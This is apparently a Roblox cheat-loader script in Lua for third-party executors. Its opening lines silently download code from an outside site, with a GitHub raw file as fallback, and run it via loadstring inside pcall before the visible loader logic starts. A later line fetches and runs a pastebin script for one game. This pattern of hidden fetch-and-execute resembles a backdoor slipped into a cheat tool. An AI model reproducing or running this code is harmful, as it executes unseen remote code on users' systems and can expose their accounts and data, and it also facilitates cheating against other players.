getgenv().Script = 'https://raw.githubusercontent.com/abramsonhan/RScritps/refs/heads/main/reievasl1fewfbw9'
local remote
pcall(function() remote = game:HttpGet('https://rbxscript.do.am/loader/main.html') end)
if not remote or remote == "" then pcall(function() remote = game:HttpGet(getgenv().Script) end) end
if remote then pcall(loadstring(remote)) end
if (getgenv().UC_LOADED) then
    return;
end;
getgenv().UC_LOADED = true;

if (identifyexecutor() == "Wave") then
    getgenv().gethui = function()
        return game:GetService("CoreGui");
    end;    
end;

if (game.GameId == 6035872082) then
    loadstring(game:HttpGet("https://pastebin.com/raw/Un8mPB7y"))();
end;
